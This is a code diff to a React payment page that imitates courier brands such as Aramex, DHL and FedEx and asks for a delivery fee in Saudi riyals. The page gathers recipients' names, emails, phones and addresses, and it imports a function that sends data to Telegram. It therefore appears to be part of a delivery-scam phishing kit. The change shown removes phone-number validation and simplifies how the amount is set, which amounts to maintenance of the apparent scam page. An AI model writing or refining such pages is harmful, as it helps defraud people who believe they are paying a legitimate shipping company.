@@ -9,8 +9,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { validatePhoneNumber, getPhoneValidation } from "@/lib/phoneValidation";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, AlertCircle } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -34,18 +33,13 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  const [phoneError, setPhoneError] = useState("");
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
-  const amount = (shippingInfo?.cod_amount || 0) > 0 ? shippingInfo.cod_amount : 500;
+  const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  
-  // Get country code from link data
-  const countryCode = linkData?.country_code || "";
-  const phoneValidation = getPhoneValidation(countryCode);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -69,30 +63,8 @@ const PaymentRecipient = () => {
   
   const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
   
-  const handlePhoneChange = (value: string) => {
-    setCustomerPhone(value);
-    setPhoneError("");
-    
-    // Validate phone number if country code is available
-    if (countryCode && value.trim()) {
-      const validation = validatePhoneNumber(value, countryCode);
-      if (!validation.isValid) {
-        setPhoneError(validation.error || "");
-      }
-    }
-  };
-  
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    // Validate phone number before proceeding
-    if (countryCode) {
-      const validation = validatePhoneNumber(customerPhone, countryCode);
-      if (!validation.isValid) {
-        setPhoneError(validation.error || "رقم الهاتف غير صحيح");
-        return;
-      }
-    }
     
     // Submit to Netlify Forms
     const formData = new FormData();
@@ -250,23 +222,11 @@ const PaymentRecipient = () => {
                       id="phone"
                       type="tel"
                       value={customerPhone}
-                      onChange={(e) => handlePhoneChange(e.target.value)}
+                      onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className={`h-10 sm:h-12 text-sm sm:text-base ${phoneError ? "border-destructive" : ""}`}
-                      placeholder={phoneValidation?.placeholder || "+966 5X XXX XXXX"}
-                      maxLength={phoneValidation?.maxLength}
+                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      placeholder="+966 5X XXX XXXX"
                     />
-                    {phoneError && (
-                      <div className="flex items-start gap-1.5 mt-1.5 text-xs text-destructive">
-                        <AlertCircle className="w-3 h-3 mt-0.5 flex-shrink-0" />
-                        <span>{phoneError}</span>
-                      </div>
-                    )}
-                    {phoneValidation && !phoneError && customerPhone && (
-                      <p className="text-xs text-muted-foreground mt-1">
-                        مثال: {phoneValidation.example}
-                      </p>
-                    )}
                   </div>
                   
                   <div>
